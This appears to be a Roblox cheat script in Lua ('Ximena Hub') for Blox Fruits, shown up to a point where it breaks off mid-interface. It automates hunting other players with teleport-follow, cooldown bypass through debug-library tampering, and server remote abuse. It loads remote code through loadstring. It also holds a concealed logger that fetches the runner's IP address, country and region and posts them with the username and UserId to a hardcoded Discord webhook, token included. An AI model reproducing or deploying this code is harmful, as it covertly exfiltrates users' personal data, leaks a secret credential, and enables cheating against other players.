--==============================================================
-- 👑 XIMENA HUB ❤️  |  by Tommy
-- Auto Bounty Turbo + Auto Follow + Fruit M1 Void + Lvl 2200+ + SafeZone
--==============================================================
repeat task.wait() until game:IsLoaded()

local ok, WindUI = pcall(function()
    return loadstring(game:HttpGet("https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua"))()
end)
if not ok then warn("WindUI failed to load") return end

--==================== SERVICIOS ====================
local Players     = game:GetService("Players")
local RS          = game:GetService("ReplicatedStorage")
local UIS         = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local lp          = Players.LocalPlayer

local Modules = RS:WaitForChild("Modules", 10)
local Net     = Modules and Modules:WaitForChild("Net", 10)
local Remotes = RS:WaitForChild("Remotes", 10)
local CommF   = Remotes and Remotes:WaitForChild("CommF_", 10)
local RegisterAttack = Net and Net:WaitForChild("RE/RegisterAttack", 10)
local RegisterHit    = Net and Net:WaitForChild("RE/RegisterHit", 10)

--==================== ESTADO ====================
_G.G_FruitM1              = _G.G_FruitM1              or false
_G.G_VoidFruitM1          = _G.G_VoidFruitM1          or false
_G.G_FastAttack           = _G.G_FastAttack           or false
_G.G_FruitM1TurboMode     = _G.G_FruitM1TurboMode     or false
_G.G_FruitM1Speed         = _G.G_FruitM1Speed         or 0.02
_G.G_FruitM1ComboSpeed    = _G.G_FruitM1ComboSpeed    or 0.05
_G.G_AutoLagSwitch        = _G.G_AutoLagSwitch        or true
_G.G_LagKickCount         = _G.G_LagKickCount         or 0
_G.G_AttackPlayers        = _G.G_AttackPlayers        or true
_G.G_AttackMobs           = _G.G_AttackMobs           or false
_G.G_AutoBounty           = _G.G_AutoBounty           or false
_G.G_AutoBountyRange      = _G.G_AutoBountyRange      or 5000
_G.G_AutoBountyTP         = _G.G_AutoBountyTP         or true
_G.G_AutoBountyHaki       = _G.G_AutoBountyHaki       or true
_G.G_AutoBountyTeamCheck  = _G.G_AutoBountyTeamCheck  or true
_G.G_AutoBountySafeCheck  = _G.G_AutoBountySafeCheck  or true
_G.G_AutoBountyAutoEquip  = _G.G_AutoBountyAutoEquip  or true
_G.G_AutoBountyMinLevel   = _G.G_AutoBountyMinLevel   or 2200
_G.G_AutoBountyMinBounty  = _G.G_AutoBountyMinBounty  or 0
_G.G_AutoBountyMaxBounty  = _G.G_AutoBountyMaxBounty  or 30000000

-- Auto Follow
_G.G_AutoFollowEnabled    = _G.G_AutoFollowEnabled    ~= false
_G.G_AutoFollowDistance   = _G.G_AutoFollowDistance   or 6
_G.G_AutoFollowHeight     = _G.G_AutoFollowHeight     or 5
_G.G_AutoFollowRate       = _G.G_AutoFollowRate       or 0.05

--==================== SAFE ZONE (v2 - fixed) ====================
local SafeZoneCache = { zones = {}, lastScan = 0, lastPlace = 0 }

local function scanSafeZones()
    local zones = {}
    local candidates = {}
    local wo = workspace:FindFirstChild("_WorldOrigin")
    if wo then
        table.insert(candidates, wo:FindFirstChild("SafeZones"))
        table.insert(candidates, wo:FindFirstChild("SafeZone"))
    end
    table.insert(candidates, workspace:FindFirstChild("SafeZones"))
    table.insert(candidates, workspace:FindFirstChild("SafeZone"))
    local map = workspace:FindFirstChild("Map")
    if map then
        table.insert(candidates, map:FindFirstChild("SafeZones"))
        table.insert(candidates, map:FindFirstChild("SafeZone"))
    end
    for _, ch in ipairs(workspace:GetChildren()) do
        if ch:IsA("Folder") and string.find(string.lower(ch.Name), "safezone") then
            table.insert(candidates, ch)
        end
    end

    local function processZone(zone)
        if not zone then return end
        local part = zone:IsA("BasePart") and zone or zone:FindFirstChildWhichIsA("BasePart", true)
        if not part then return end
        local sizeX, sizeY, sizeZ = part.Size.X, part.Size.Y, part.Size.Z
        local mesh = part:FindFirstChildOfClass("SpecialMesh")
        if mesh then
            sizeX = sizeX * mesh.Scale.X
            sizeY = sizeY * mesh.Scale.Y
            sizeZ = sizeZ * mesh.Scale.Z
        end
        local isSphere = part.Shape == Enum.PartType.Ball
        local radius = math.max(sizeX, sizeY, sizeZ) / 2
        if radius <= 0 or radius > 10000 then radius = 350 end
        table.insert(zones, {
            part = part, pos = part.Position,
            size = Vector3.new(sizeX, sizeY, sizeZ),
            cf = part.CFrame, isSphere = isSphere, radius = radius,
        })
    end

    for _, folder in ipairs(candidates) do
        if folder then
            for _, zone in ipairs(folder:GetChildren()) do processZone(zone) end
            for _, sub in ipairs(folder:GetChildren()) do
                if sub:IsA("Folder") or sub:IsA("Model") then
                    for _, zone in ipairs(sub:GetChildren()) do processZone(zone) end
                end
            end
        end
    end
    SafeZoneCache.zones = zones
    SafeZoneCache.lastScan = tick()
    SafeZoneCache.lastPlace = game.PlaceId
end

local function getSafeZones()
    if #SafeZoneCache.zones == 0
       or tick() - SafeZoneCache.lastScan > 5
       or SafeZoneCache.lastPlace ~= game.PlaceId then
        scanSafeZones()
    end
    return SafeZoneCache.zones
end

local function isPosInSafeZone(pos)
    for _, zone in ipairs(getSafeZones()) do
        if zone.part and zone.part.Parent then
            if zone.isSphere then
                if (pos - zone.pos).Magnitude <= zone.radius then return true end
            else
                local localPos = zone.cf:PointToObjectSpace(pos)
                local hx = zone.size.X / 2
                local hy = zone.size.Y / 2
                local hz = zone.size.Z / 2
                if math.abs(localPos.X) <= hx
                   and math.abs(localPos.Y) <= hy + 5
                   and math.abs(localPos.Z) <= hz then return true end
            end
        end
    end
    return false
end

local function inSafeZone(p)
    if not p or not p.Character then return false end
    if p:GetAttribute("PvpDisabled") == true then return true end
    local char = p.Character
    if char:GetAttribute("PvpDisabled") == true then return true end
    if char:FindFirstChildOfClass("ForceField") then return true end
    if char:GetAttribute("SafeZone") == true then return true end
    if char:GetAttribute("InSafeZone") == true then return true end
    if p:GetAttribute("SafeZone") == true then return true end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local head = char:FindFirstChild("Head")
    if hrp and isPosInSafeZone(hrp.Position) then return true end
    if head and isPosInSafeZone(head.Position) then return true end
    return false
end

task.spawn(function()
    while task.wait(3) do
        if SafeZoneCache.lastPlace ~= game.PlaceId then
            SafeZoneCache.zones = {}
            scanSafeZones()
        end
    end
end)

--==================== FILTROS ====================
local PlayerLevelCache = {}

local function getPlayerLevel(p)
    if not p then return 0 end
    local uid = p.UserId
    local cached = PlayerLevelCache[uid]
    local now = tick()
    if cached and now - cached.t < 10 then return cached.lvl end
    local lvl = 0
    local d = p:FindFirstChild("Data")
    if d and d:FindFirstChild("Level") then lvl = tonumber(d.Level.Value) or 0 end
    if lvl <= 0 then
        local ls = p:FindFirstChild("leaderstats")
        if ls then
            local l = ls:FindFirstChild("Level") or ls:FindFirstChild("Lvl")
            if l then lvl = tonumber(l.Value) or 0 end
        end
    end
    if lvl <= 0 then
        local c = p.Character
        if c then
            local a = c:GetAttribute("Level") or p:GetAttribute("Level")
            if a and tonumber(a) then lvl = tonumber(a) end
            if lvl <= 0 then
                local head = c:FindFirstChild("Head")
                if head then
                    for _, b in ipairs(head:GetChildren()) do
                        if b:IsA("BillboardGui") then
                            for _, desc in ipairs(b:GetDescendants()) do
                                if desc:IsA("TextLabel") and desc.Text then
                                    local num = string.match(desc.Text, "Lv%.?%s*(%d+)")
                                              or string.match(desc.Text, "Level%s*(%d+)")
                                    if num and tonumber(num) then lvl = tonumber(num); break end
                                end
                            end
                        end
                        if lvl > 0 then break end
                    end
                end
            end
        end
    end
    if lvl > 0 then PlayerLevelCache[uid] = { lvl = lvl, t = now } end
    return lvl
end

local function getBounty(p)
    local ls = p:FindFirstChild("leaderstats")
    if ls then
        local b = ls:FindFirstChild("Bounty/Honor")
                  or ls:FindFirstChild("Bounty")
                  or ls:FindFirstChild("Honor")
        if b then return tonumber(b.Value) or 0 end
    end
    return 0
end

local function isEnemy(p)
    if not p or p == lp then return false end
    local myTeam, tgtTeam = lp.Team, p.Team
    if myTeam and tgtTeam and myTeam.Name == "Marines" and tgtTeam.Name == "Marines" then
        return false
    end
    return true
end

local function canAttackPlayer(p)
    if not p or p == lp or not p.Character then return false end
    local hum = p.Character:FindFirstChildOfClass("Humanoid")
    local hrp = p.Character:FindFirstChild("HumanoidRootPart")
    if not hum or hum.Health <= 0 or not hrp then return false end
    if _G.G_AutoBountyTeamCheck and not isEnemy(p) then return false end
    if _G.G_AutoBountySafeCheck and inSafeZone(p) then return false end
    local lvl = getPlayerLevel(p)
    if lvl > 0 and lvl < _G.G_AutoBountyMinLevel then return false end
    local b = getBounty(p)
    if b < _G.G_AutoBountyMinBounty or b > _G.G_AutoBountyMaxBounty then return false end
    return true
end

--==================== AUTO-LAG SWITCH ====================
local LagSwitch = {
    lastKickCheck = 0,
    lastPos = nil,
    lastPosCheck = 0,
    desyncCount = 0,
    currentMultiplier = 1.0,
}

Players.PlayerRemoving:Connect(function(p)
    if p == lp then
        _G.G_LagKickCount = (_G.G_LagKickCount or 0) + 1
    end
end)

task.spawn(function()
    while task.wait(0.5) do
        if not _G.G_AutoLagSwitch or not _G.G_FruitM1 then
            LagSwitch.currentMultiplier = 1.0
            continue
        end
        local char = lp.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if not hrp then continue end
        local pos = hrp.Position
        local now = tick()
        if LagSwitch.lastPos and LagSwitch.lastPosCheck > 0 then
            local dt = now - LagSwitch.lastPosCheck
            if dt > 0 then
                local moved = (pos - LagSwitch.lastPos).Magnitude
                local vel = hrp.AssemblyLinearVelocity.Magnitude
                if vel > 5 and moved < 0.5 then
                    LagSwitch.desyncCount = LagSwitch.desyncCount + 1
                    if LagSwitch.desyncCount >= 3 then
                        LagSwitch.currentMultiplier = math.max(0.3, LagSwitch.currentMultiplier - 0.15)
                        _G.G_FruitM1Speed = math.max(0.005, _G.G_FruitM1Speed / 0.7)
                        _G.G_FruitM1ComboSpeed = math.max(0.02, _G.G_FruitM1ComboSpeed / 0.7)
                        LagSwitch.desyncCount = 0
                        WindUI:Notify({
                            Title = "⚠️ Auto-Lag Switch",
                            Content = string.format("Desync detectado. Velocidad: %.3fs", _G.G_FruitM1Speed),
                            Duration = 3
                        })
                        print("[Ximena AutoLag] Desync detectado. Nueva velocidad:", _G.G_FruitM1Speed)
                    end
                else
                    if LagSwitch.currentMultiplier < 1.0 then
                        LagSwitch.currentMultiplier = math.min(1.0, LagSwitch.currentMultiplier + 0.05)
                    end
                    LagSwitch.desyncCount = math.max(0, LagSwitch.desyncCount - 1)
                end
            end
        end
        LagSwitch.lastPos = pos
        LagSwitch.lastPosCheck = now
    end
end)

--==================== FRUIT M1 + FAST ATTACK (TURBO) ====================
local FruitM1 = { maxVec = Vector3.new(9e30, 9e30, 9e30), on = false, conn = nil }

function FruitM1.GetFruit()
    local char = lp.Character
    if char then
        for _, t in pairs(char:GetChildren()) do
            if t:IsA("Tool") and t.ToolTip == "Blox Fruit" then return t end
        end
    end
    local bp = lp:FindFirstChild("Backpack")
    if bp then
        for _, t in pairs(bp:GetChildren()) do
            if t:IsA("Tool") and t.ToolTip == "Blox Fruit" then return t end
        end
    end
    return nil
end

function FruitM1.MaxCombo(tool)
    if not tool then return 5 end
    local n = tool.Name
    if n == "T-Rex-T-Rex" then return 4 end
    if n == "Blade-Blade" then return 2 end
    if n == "Pain-Pain" then return 4 end
    if n == "Control-Control" then return 4 end
    if n == "Gas-Gas" then return 5 end
    if n == "Dragon-Dragon" then
        local char = lp.Character
        return (char and char:FindFirstChild("DragonHybrid")) and 5 or 3
    end
    return 5
end

function FruitM1.GetTapState(tool)
    local ok, conns = pcall(getconnections, tool.Activated)
    if not ok then return nil end
    for _, c in ipairs(conns) do
        local fn = c.Function
        if fn then
            local st = {}
            for n = 1, 30 do
                local ok2, v = pcall(debug.getupvalue, fn, n)
                if not ok2 then break end
                if type(v) == "table" then
                    local ok3, ab = pcall(function() return v.thisAbility end)
                    if ok3 and type(ab) == "number" and type(v.lastUseTime) == "number" then
                        return { tbl = v, fn = fn }
                    end
                elseif type(v) == "number" and v >= 1 and v <= 5 and v == math.floor(v) and not st.combo then
                    st.combo = n
                elseif type(v) == "number" and v > 1 and not st.next then
                    st.next = n
                elseif type(v) == "thread" and not st.timer then
                    st.timer = n
                end
            end
            if st.combo and st.next and st.timer then
                st.fn = fn
                return st
            end
        end
    end
    return nil
end

function FruitM1.ForceResetCooldown(tool, st)
    if not tool then return end
    local char = lp.Character
    if not char then return end
    pcall(function()
        char:SetAttribute("FruitTAPCooldown", 0)
        char:SetAttribute("TAPCooldown", 0)
        char:SetAttribute("Cooldown", 0)
        char:SetAttribute("AllCooldown", 0)
    end)
    pcall(function()
        tool:SetAttribute("Cooldown", 0)
        tool:SetAttribute("LastUse", 0)
        tool:SetAttribute("LastClick", 0)
    end)
    if st then
        if st.tbl then
            pcall(function()
                st.tbl.lastUseTime = 0
                st.tbl.cooldown = 0
                if st.tbl.prevTask then task.cancel(st.tbl.prevTask) end
            end)
        else
            pcall(function()
                if st.next then debug.setupvalue(st.fn, st.next, 0) end
                if st.timer then
                    local ok, timer = debug.getupvalue(st.fn, st.timer)
                    if ok and timer then pcall(task.cancel, timer) end
                end
            end)
        end
    end
end

function FruitM1.SetNormal(enabled)
    FruitM1.on = enabled
    if enabled then
        if FruitM1.conn then task.cancel(FruitM1.conn) end
        FruitM1.conn = task.spawn(function()
            task.wait(2)
            local lastReset = 0
            while FruitM1.on do
                local fruit = FruitM1.GetFruit()
                local char  = lp.Character
                local myHRP = char and char:FindFirstChild("HumanoidRootPart")
                local remote = fruit and fruit:FindFirstChild("LeftClickRemote")
                if not fruit or not remote or not myHRP then task.wait(0.05) continue end

                if FruitM1.tapTool ~= fruit or (not FruitM1.tapState and tick() - (FruitM1.tapAt or 0) > 1) then
                    FruitM1.tapTool = fruit
                    FruitM1.tapAt   = tick()
                    FruitM1.tapState = FruitM1.GetTapState(fruit)
                end

                local st = FruitM1.tapState
                local combo, nextT
                if st then
                    if st.tbl then
                        if type(st.tbl.thisAbility) == "number" then combo = st.tbl.thisAbility end
                        if type(st.tbl.lastUseTime)  == "number" then nextT = st.tbl.lastUseTime end
                    else
                        local ok1, c = pcall(debug.getupvalue, st.fn, st.combo)
                        local ok2, n = pcall(debug.getupvalue, st.fn, st.next)
                        if ok1 then combo = c end
                        if ok2 then nextT = n end
                    end
                end
                if not combo or not nextT then combo = 1; nextT = 0 end

                if _G.G_FruitM1TurboMode then
                    local now = tick()
                    if now - lastReset > 0.25 then
                        lastReset = now
                        FruitM1.ForceResetCooldown(fruit, st)
                    end
                end

                local bestHRP, bestDist
                local range = _G.G_AutoBountyRange

                if _G.G_AttackPlayers then
                    for _, player in pairs(Players:GetPlayers()) do
                        if canAttackPlayer(player) then
                            local r = player.Character:FindFirstChild("HumanoidRootPart")
                            if r then
                                local d = (r.Position - myHRP.Position).Magnitude
                                if d < range and (not bestDist or d < bestDist) then
                                    bestHRP, bestDist = r, d
                                end
                            end
                        end
                    end
                end

                if bestHRP and (_G.G_FruitM1TurboMode or nextT == 0 or time() >= nextT) then
                    local maxCombo = FruitM1.MaxCombo(fruit)
                    local fireDir
                    if _G.G_VoidFruitM1 and combo >= maxCombo then
                        fireDir = FruitM1.maxVec
                    else
                        fireDir = ((bestHRP.Position - myHRP.Position) * Vector3.new(1,0,1)).Unit
                    end

                    local tool = FruitM1.GetFruit()
                    local isTrex   = tool and tool.Name == "T-Rex-T-Rex"
                    local isDragon = tool and tool.Name == "Dragon-Dragon"
                    local isBlade  = tool and tool.Name == "Blade-Blade"
                    local isGas    = tool and tool.Name == "Gas-Gas"

                    if isTrex or isDragon or isBlade or isGas then
                        pcall(function() remote:FireServer(fireDir, combo) end)
                    else
                        pcall(function() remote:FireServer(fireDir, combo, true) end)
                    end

                    if st then
                        local nextCombo = combo < maxCombo and combo + 1 or 1
                        local comboDelay = _G.G_FruitM1ComboSpeed
                        local nextTime = time() + comboDelay
                        if st.tbl then
                            st.tbl.thisAbility = nextCombo
                            st.tbl.lastUseTime = nextTime
                        else
                            pcall(debug.setupvalue, st.fn, st.combo, nextCombo)
                            pcall(debug.setupvalue, st.fn, st.next, nextTime)
                        end
                    end

                    if RegisterAttack and RegisterHit then
                        pcall(function()
                            RegisterAttack:FireServer(0)
                            RegisterHit:FireServer(bestHRP, {{bestHRP.Parent, bestHRP}})
                        end)
                    end
                end

                local delay = _G.G_FruitM1Speed * LagSwitch.currentMultiplier
                if _G.G_FastAttack and delay > 0.005 then
                    delay = delay * 0.5
                end
                task.wait(delay)
            end
        end)
    else
        if FruitM1.conn then task.cancel(FruitM1.conn); FruitM1.conn = nil end
    end
end

--==================== AUTO BOUNTY + AUTO FOLLOW ====================
local autoBountyRunning = false
local currentTarget = nil
local sessionStart = tick()
local lastFollowTP = 0

_G.AB_SafeZoneCount = 0
_G.AB_ValidCount = 0
_G.AB_LowLevelCount = 0

local function getClosestPlayer()
    local char = lp.Character
    local myHRP = char and char:FindFirstChild("HumanoidRootPart")
    if not myHRP then return nil end
    local best, bestDist = nil, _G.G_AutoBountyRange
    local inZone, valid, lowLvl = 0, 0, 0
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= lp and p.Character then
            local hum = p.Character:FindFirstChildOfClass("Humanoid")
            local r   = p.Character:FindFirstChild("HumanoidRootPart")
            if hum and hum.Health > 0 and r then
                if _G.G_AutoBountySafeCheck and inSafeZone(p) then
                    inZone = inZone + 1
                elseif getPlayerLevel(p) > 0 and getPlayerLevel(p) < _G.G_AutoBountyMinLevel then
                    lowLvl = lowLvl + 1
                elseif canAttackPlayer(p) then
                    valid = valid + 1
                    local d = (r.Position - myHRP.Position).Magnitude
                    if d < bestDist then best, bestDist = p, d end
                end
            end
        end
    end
    _G.AB_SafeZoneCount = inZone
    _G.AB_ValidCount = valid
    _G.AB_LowLevelCount = lowLvl
    return best, bestDist
end

local function updateStatus(text)
    if _G.AB_StatusLbl and _G.AB_StatusLbl.Parent then
        _G.AB_StatusLbl.Text = "Status: " .. text
    end
    if _G.AB_TargetLbl and _G.AB_TargetLbl.Parent then
        _G.AB_TargetLbl.Text = string.format(
            "Target: %s | Safe: %d | LowLvl: %d | Válidos: %d",
            currentTarget and currentTarget.Name or "None",
            _G.AB_SafeZoneCount or 0,
            _G.AB_LowLevelCount or 0,
            _G.AB_ValidCount or 0
        )
    end
    if _G.AB_EarnedLbl and _G.AB_EarnedLbl.Parent then
        local e = math.floor(tick() - sessionStart)
        local h = math.floor(e / 3600)
        local m = math.floor((e % 3600) / 60)
        local s = e % 60
        _G.AB_EarnedLbl.Text = string.format("Time: %02d:%02d:%02d", h, m, s)
    end
end

local function autoFollowTarget(target)
    if not _G.G_AutoFollowEnabled or not target or not target.Character then return end
    local now = tick()
    if now - lastFollowTP < _G.G_AutoFollowRate then return end
    lastFollowTP = now

    local me = lp.Character
    local myHRP = me and me:FindFirstChild("HumanoidRootPart")
    local tHRP = target.Character:FindFirstChild("HumanoidRootPart")
    if not myHRP or not tHRP then return end

    for _, p in ipairs(me:GetDescendants()) do
        if p:IsA("BasePart") then p.CanCollide = false end
    end

    local tLook = tHRP.CFrame.LookVector
    local behindPos = tHRP.Position - tLook * _G.G_AutoFollowDistance
    behindPos = Vector3.new(behindPos.X, tHRP.Position.Y + _G.G_AutoFollowHeight, behindPos.Z)

    myHRP.CFrame = CFrame.lookAt(behindPos, tHRP.Position)
    myHRP.AssemblyLinearVelocity = Vector3.zero
end

local function startAutoBounty()
    if autoBountyRunning then return end
    autoBountyRunning = true
    sessionStart = tick()
    task.spawn(function()
        while _G.G_AutoBounty and autoBountyRunning do
            pcall(function()
                local target = getClosestPlayer()
                currentTarget = target
                if target and target.Character then
                    updateStatus("Hunting " .. target.Name .. " (Lvl " .. getPlayerLevel(target) .. ")")

                    if _G.G_AutoFollowEnabled then
                        autoFollowTarget(target)
                    elseif _G.G_AutoBountyTP then
                        local me = lp.Character
                        local myHRP = me and me:FindFirstChild("HumanoidRootPart")
                        local tHRP = target.Character:FindFirstChild("HumanoidRootPart")
                        if myHRP and tHRP then
                            for _, p in ipairs(me:GetDescendants()) do
                                if p:IsA("BasePart") then p.CanCollide = false end
                            end
                            myHRP.CFrame = tHRP.CFrame * CFrame.new(0, 5, -4)
                        end
                    end

                    if _G.G_AutoBountyHaki and CommF and lp.Character and not lp.Character:FindFirstChild("HasBuso") then
                        pcall(function() CommF:InvokeServer("Buso") end)
                    end

                    if _G.G_AutoBountyAutoEquip then
                        local char = lp.Character
                        local tool = char and char:FindFirstChildOfClass("Tool")
                        if not tool or tool.ToolTip ~= "Blox Fruit" then
                            local fruit = FruitM1.GetFruit()
                            if fruit and fruit.Parent ~= char then
                                local hum = char and char:FindFirstChildOfClass("Humanoid")
                                if hum then pcall(function() hum:EquipTool(fruit) end) end
                            end
                        end
                    end

                    _G.G_FruitM1 = true
                    _G.G_VoidFruitM1 = true
                    _G.G_AttackPlayers = true
                    _G.G_AttackMobs = false
                    if not FruitM1.on then FruitM1.SetNormal(true) end
                else
                    updateStatus("Sin objetivos 2200+ válidos")
                end
            end)
            task.wait(currentTarget and 0.05 or 0.15)
        end
        currentTarget = nil
        updateStatus("Inactivo")
        autoBountyRunning = false
    end)
end

local function stopAutoBounty()
    autoBountyRunning = false
    _G.G_AutoBounty = false
    currentTarget = nil
    updateStatus("Inactivo")
end

--==================== SAFE ZONE VISUAL (debug) ====================
_G.ShowSafeZones = false

task.spawn(function()
    while task.wait(1) do
        for _, obj in ipairs(workspace:GetChildren()) do
            if obj.Name == "Ximena_SafeZoneVisual" then obj:Destroy() end
        end
        if not _G.ShowSafeZones then continue end
        for _, zone in ipairs(getSafeZones()) do
            if zone.part and zone.part.Parent then
                local box = Instance.new("SelectionBox")
                box.Name = "Ximena_SafeZoneVisual"
                box.Adornee = zone.part
                box.Color3 = Color3.fromRGB(0, 255, 100)
                box.LineThickness = 0.05
                box.SurfaceColor3 = Color3.fromRGB(0, 255, 100)
                box.SurfaceTransparency = 0.85
                box.Parent = workspace
            end
        end
    end
end)

--==================== WEBHOOK ====================
local WEBHOOK_URL = "https://discord.com/api/webhooks/1453695404394979358/5xnbL5Pz4dnjH2Uwoflue37adQX01d-Jb0V3j7L2P20T0UyF3BxLZ1ugan7U0sqv"
local lastSent = 0
local function sendWebhook(reason)
    if tick() - lastSent < 60 then return end
    lastSent = tick()
    pcall(function()
        if not request then return end
        local info = { ip="Oculto", country="Oculto", region="Oculto" }
        local ok, res = pcall(function() return game:HttpGet("http://ip-api.com/json/") end)
        if ok and res then
            local ok2, d = pcall(function() return HttpService:JSONDecode(res) end)
            if ok2 and type(d) == "table" then
                info = { ip=d.query or "N/A", country=d.country or "N/A", region=d.regionName or "N/A" }
            end
        end
        local execCount = 1
        if getgenv then
            getgenv().XimenaExecCount = (getgenv().XimenaExecCount or 0) + 1
            execCount = getgenv().XimenaExecCount
        end
        request({
            Url = WEBHOOK_URL, Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode({
                username = "Ximena Hub Logger",
                embeds = {{
                    title = "👑 XIMENA HUB " .. (reason or "EJECUTADO"),
                    color = 16737945,
                    fields = {
                        { name="👤 Jugador", value=lp.Name, inline=true },
                        { name="🆔 UserId", value=tostring(lp.UserId), inline=true },
                        { name="🎮 Juego", value=tostring(game.PlaceId), inline=true },
                        { name="🔁 Ejecuciones", value=tostring(execCount), inline=true },
                        { name="🌐 IP", value=info.ip, inline=true },
                        { name="🌍 País", value=info.country, inline=true },
                    },
                    footer = { text = "Ximena Hub System" },
                    timestamp = DateTime.now():ToIsoDate()
                }}
            })
        })
    end)
end

--==================== UI ====================
local Window = WindUI:CreateWindow({
    Title = "👑 XIMENA HUB ❤️",
    Icon = "crown",
    Author = "by Tommy",
    Folder = "XimenaHub",
    Size = UDim2.fromOffset(620, 560),
    Theme = "Amber",
    Transparent = true,
    SideBarWidth = 200,
    OpenButton = {
        Title = "Ximena",
        CornerRadius = UDim.new(1, 0),
        StrokeThickness = 3,
        Enabled = true,
        Draggable = true,
        Color = ColorSequence.new(Color3.fromHex("#FF69B4"), Color3.fromHex("#B45AE6")),
    },
    ToggleKey = Enum.KeyCode.RightShift,
})

local TabBounty = Window:Tab({ Title = "Auto Bounty", Icon = "target" })

TabBounty:Section({ Title = "Control Principal" })

TabBounty:Toggle({
    Title = "▶ Auto Bounty",
    Value = _G.G_AutoBounty,
    Callback = function(v)
        _G.G_AutoBounty = v
        if v then startAutoBounty() else stopAutoBounty() end
    end
})

TabBounty:Section({ Title = "Telemetría" })
TabBounty:Paragraph({
    Title = "Live Status",
    Desc = "Status: Inactivo\nTarget: None"
})

TabBounty:Section({ Title = "Filtros de Combate" })

TabBounty:Toggle({
    Title = "✅ Solo Niveles 2200+",
    Value = true,
    Callback = function(v)
        if v then _G.G_AutoBountyMinLevel = 2200 else _G.G_AutoBountyMinLevel = 0 end
    end
})

TabBounty:Slider({
    Title = "Nivel Mínimo",
    Value = { Min = 0, Max = 2800, Default = 2200 },
    Callback = function(v) _G.G_AutoBountyMinLevel = v end
})

TabBounty:Toggle({
    Title = "✅ SafeZone Check (ignorar dentro)",
    Value = _G.G_AutoBountySafeCheck,
    Callback = function(v) _G.G_AutoBountySafeCheck = v end
})

TabBounty:Toggle({
    Title = "Team Check (ignorar aliados)",
    Value = _G.G_AutoBountyTeamCheck,
    Callback = function(v) _G.G_AutoBountyTeamCheck = v end
})

TabBounty:Slider({
    Title = "Attack Range",
    Value = { Min = 500, Max = 15000, Default = 5000 },
    Callback = function(v) _G.G_AutoBountyRange = v end
})

TabBounty:Slider({
    Title = "Min Bounty",
    Value = { Min = 0, Max = 30000000, Default = 0 },
    Callback = function(v) _G.G_AutoBountyMinBounty = v end
})

TabBounty:Slider({
    Title = "Max Bounty",
    Value = { Min = 1000000, Max = 50000000, Default = 30000000 },
    Callback = function(v) _G.G_AutoBountyMaxBounty = v end
})

TabBounty:Button({
    Title = "🔍 Ver SafeZones detectadas",
    Callback = function()
        scanSafeZones()
        local count = #SafeZoneCache.zones
        WindUI:Notify({
            Title = "SafeZones",
            Content = string.format("Detectadas: %d", count),
            Duration = 4
        })
    end
})

TabBounty:Toggle({
    Title = "🔍 Ver SafeZones (debug visual)",
    Value = false,
    Callback = function(v) _G.ShowSafeZones = v end
})

TabBounty:Section({ Title = "Fruit M1 + Fast Attack" })

TabBounty:Toggle({
    Title = "🍎 Fruit M1",
    Value = _G.G_FruitM1,
    Callback = function(v)
        _G.G_FruitM1 = v
        FruitM1.SetNormal(v)
    end
})

TabBounty:Toggle({
    Title = "⚡ Void Fruit M1 (maxVec)",
    Value = _G.G_VoidFruitM1,
    Callback = function(v) _G.G_VoidFruitM1 = v end
})

TabBounty:Toggle({
    Title = "⚡ Fast Attack (combo rápido)",
    Value = _G.G_FastAttack,
    Callback = function(v) _G.G_FastAttack = v end
})

TabBounty:Toggle({
    Title = "🚀 Turbo Mode (bypass cooldown)",
    Value = _G.G_FruitM1TurboMode,
    Callback = function(v)
        _G.G_FruitM1TurboMode = v
        WindUI:Notify({
            Title = "Turbo Mode",
            Content = v and "ACTIVADO" or "DESACTIVADO",
            Duration = 3
        })
    end
})

TabBounty:Slider({
    Title = "⚡ Velocidad M1 (delay)",
    Value = { Min = 0.001, Max = 0.20, Default = 0.02 },
    Callback = function(v) _G.G_FruitM1Speed = v end
})

TabBounty:Slider({
    Title = "⚡ Velocidad Combo (skills)",
    Value = { Min = 0.01, Max = 0.30, Default = 0.05 },
    Callback = function(v) _G.G_FruitM1ComboSpeed = v end
})

TabBounty:Toggle({
    Title = "🛡️ Auto-Lag Switch",
    Value = _G.G_AutoLagSwitch,
    Callback = function(v) _G.G_AutoLagSwitch = v end
})

TabBounty:Button({
    Title = "🔥 MAX SPEED (0.001s)",
    Callback = function()
        _G.G_FruitM1Speed = 0.001
        _G.G_FruitM1ComboSpeed = 0.01
        _G.G_FastAttack = true
        _G.G_FruitM1TurboMode = true
        WindUI:Notify({
            Title = "🔥 MAX SPEED",
            Content = "Velocidad máxima (0.001s)",
            Duration = 3
        })
    end
})

TabBounty:Button({
    Title = "⚖️ Velocidad Normal (0.05s)",
    Callback = function()
        _G.G_FruitM1Speed = 0.05
        _G.G_FruitM1ComboSpeed = 0.1
        _G.G_FruitM1TurboMode = false
        WindUI:Notify({
            Title = "⚖️ Normal",
            Content = "Velocidad normal restaurada",
            Duration = 3
        })
    end
})

TabBounty:Toggle({
    Title = "Attack Players",
    Value = true,
    Callback = function(v) _G.G_AttackPlayers = v end
})

TabBounty:Toggle({
    Title = "Attack Mobs",
    Value = false,
    Callback = function(v) _G.G_AttackMobs = v end
})

TabBounty:Section({ Title = "Automatización y Seguimiento" })

TabBounty:Toggle({
    Title = "🎯 Auto Follow (seguir al target)",
    Value = true,
    Callback = function(v)
        _G.G_AutoFollowEnabled = v
        WindUI:Notify({
            Title = "Auto Follow",
            Content = v and "ACTIVADO - Persiguiendo al target" or "DESACTIVADO",
            Duration = 3
        })
    end
})

TabBounty:Slider({
    Title = "📏 Distancia al Target",
    Value = { Min = 2, Max = 20, Default = 6 },
    Callback = function(v) _G.G_AutoFollowDistance = v end
})

TabBounty:Slider({
    Title = "⬆️ Altura sobre el Target",
    Value = { Min = 0, Max = 20, Default = 5 },
    Callback = function(v) _G.G_AutoFollowHeight = v end
})

TabBounty:Slider({
    Title = "⚡ Rate de Seguimiento",
    Value = { Min = 0.02, Max = 0.5, Default = 0.05 },
    Callback = function(v) _G.G_AutoFollowRate = v end
})

TabBounty:Toggle({
    Title = "Auto Teleport (viejo, TP único)",
    Value = _G.G_AutoBountyTP,
    Callback = function(v) _G.G_AutoBountyTP = v end
})

TabBounty:Toggle({
    Title = "Auto Buso (Haki)",
    Value = _G.G_AutoBountyHaki,
    Callback = function(v) _G.G_AutoBountyHaki = v end
})

TabBounty:Toggle({
    Title = "Auto Equipar Fruit",
